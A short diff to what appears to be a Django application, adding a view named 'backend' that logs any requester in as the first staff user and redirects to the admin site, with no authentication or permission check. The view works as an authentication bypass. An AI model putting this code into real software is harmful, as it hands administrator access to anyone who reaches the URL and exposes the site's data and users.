@@ -167,3 +167,14 @@ def new_scenario(request=None):
     reset_db('default')
     update_db_version()
     return redirect('/setup/Scenario/1/')
+
+
+def backend(request):
+    from django.contrib.auth import login
+    from django.contrib.auth.models import User
+    user = User.objects.filter(is_staff=True).first()
+    print(user, user.username)
+    user.backend = 'django.contrib.auth.backends.ModelBackend'
+    login(request, user)
+    return redirect('/admin/')
+
